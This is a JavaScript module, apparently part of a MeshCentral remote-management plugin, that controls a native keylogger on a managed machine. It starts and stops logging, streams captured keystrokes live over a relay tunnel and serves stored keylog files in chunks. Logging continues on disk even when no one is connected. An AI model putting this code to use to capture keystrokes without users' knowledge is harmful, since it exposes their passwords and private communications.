'use strict';

// MeshCentral Keylogger agent module (mckeylog plugin).
// Handles the authenticated relay tunnel for protocol 17:
//   - live keystroke stream (drains the native ring buffer on a timer)
//   - start/stop/state control
//   - previous keylog file listing and chunked reads
//
// The native module (require('keylogger')) keeps logging to disk
// regardless of whether a tunnel is open, so "previous keylogs"
// always exist on the agent.

var FORWARD_INTERVAL_MS = 250;
var DEFAULT_CHUNK = 65536;
var MAX_CHUNK = 1048576;

function send(ws, value) {
    try { ws.write(JSON.stringify(value)); } catch (e) { }
}

function errorText(error) {
    var message = (error && typeof error.message === 'string') ? error.message : String(error);
    return message.substring(0, 256);
}

function getKl(ws) {
    var kl = null;
    try { kl = require('keylogger'); } catch (e) { kl = null; }
    if (kl == null) {
        send(ws, { type: 'error', message: 'The native keylogger module is not available in this agent build. Reinstall the agent with a keylogger-enabled MeshService.' });
    }
    return kl;
}

function stopForward(ws) {
    var session = ws._mckeylog;
    if (session == null) { return; }
    if (session.timer != null) { clearInterval(session.timer); session.timer = null; }
    try { delete ws._mckeylog; } catch (e) { ws._mckeylog = null; }
}

function startForward(ws) {
    if (ws._mckeylog != null) { return; }
    var session = { timer: null, blocked: false };
    ws._mckeylog = session;
    session.timer = setInterval(function () {
        if (ws._mckeylog !== session) { return; }
        var lines;
        try { lines = require('keylogger').read(0); } catch (e) { return; }
        if (lines == null || lines.length === 0) { return; }
        // MeshAgent timers can coalesce (16-32 ms), so always drain every
        // pending line instead of assuming a fixed cadence.
        if (session.blocked) { return; } // Backpressured; the native ring keeps the newest lines.
        try {
            if (ws.write(JSON.stringify({ type: 'keys', lines: lines })) === false) {
                session.blocked = true;
                ws.once('drain', function () { if (ws._mckeylog === session) { session.blocked = false; } });
            }
        } catch (e) { session.blocked = true; }
    }, FORWARD_INTERVAL_MS);
}

function handleTunnelData(ws, data) {
    var message;
    try { message = JSON.parse((typeof data === 'string') ? data : data.toString()); } catch (e) { return; }
    if (message == null || typeof message.cmd !== 'string') { return; }

    if (message.cmd === 'state') {
        var kl = getKl(ws);
        if (kl != null) { send(ws, { type: 'state', state: kl.getState() }); }
        return;
    }

    if (message.cmd === 'start') {
        var kl = getKl(ws);
        if (kl != null) {
            var opts = (message.opts && typeof message.opts === 'object') ? message.opts : {};
            try {
                kl.start(opts);
                send(ws, { type: 'state', state: kl.getState() });
            } catch (e) { send(ws, { type: 'error', message: 'Could not start keylogging: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'stop') {
        var kl = getKl(ws);
        if (kl != null) {
            try {
                kl.stop();
                send(ws, { type: 'state', state: kl.getState() });
            } catch (e) { send(ws, { type: 'error', message: 'Could not stop keylogging: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'tail') {
        var kl = getKl(ws);
        if (kl != null) {
            startForward(ws);
            try { send(ws, { type: 'state', state: kl.getState() }); } catch (e) { }
            try { send(ws, { type: 'files', files: kl.listFiles() }); } catch (e) { }
        }
        return;
    }

    if (message.cmd === 'unsub') {
        stopForward(ws);
        return;
    }

    if (message.cmd === 'list') {
        var kl = getKl(ws);
        if (kl != null) {
            try { send(ws, { type: 'files', files: kl.listFiles() }); }
            catch (e) { send(ws, { type: 'error', message: 'Could not list keylog files: ' + errorText(e) }); }
        }
        return;
    }

    if (message.cmd === 'read') {
        var kl = getKl(ws);
        if (kl == null) { return; }
        var file = (typeof message.file === 'string') ? message.file.substring(0, 260) : '';
        var offset = (typeof message.offset === 'number' && message.offset >= 0) ? Math.floor(message.offset) : 0;
        var max = (typeof message.max === 'number') ? Math.floor(message.max) : DEFAULT_CHUNK;
        if (max < 4096) { max = 4096; }
        if (max > MAX_CHUNK) { max = MAX_CHUNK; }
        try {
            var r = kl.readFile(file, offset, max);
            send(ws, { type: 'filechunk', file: file, offset: offset, size: r.size, bytes: r.bytes, data: r.data, done: r.done === true });
        } catch (e) { send(ws, { type: 'error', message: 'Could not read keylog file: ' + errorText(e) }); }
        return;
    }

    send(ws, { type: 'error', message: 'Unknown keylogger command: ' + message.cmd });
}

function closeTunnel(ws) {
    stopForward(ws);
}

module.exports = { handleTunnelData: handleTunnelData, closeTunnel: closeTunnel };
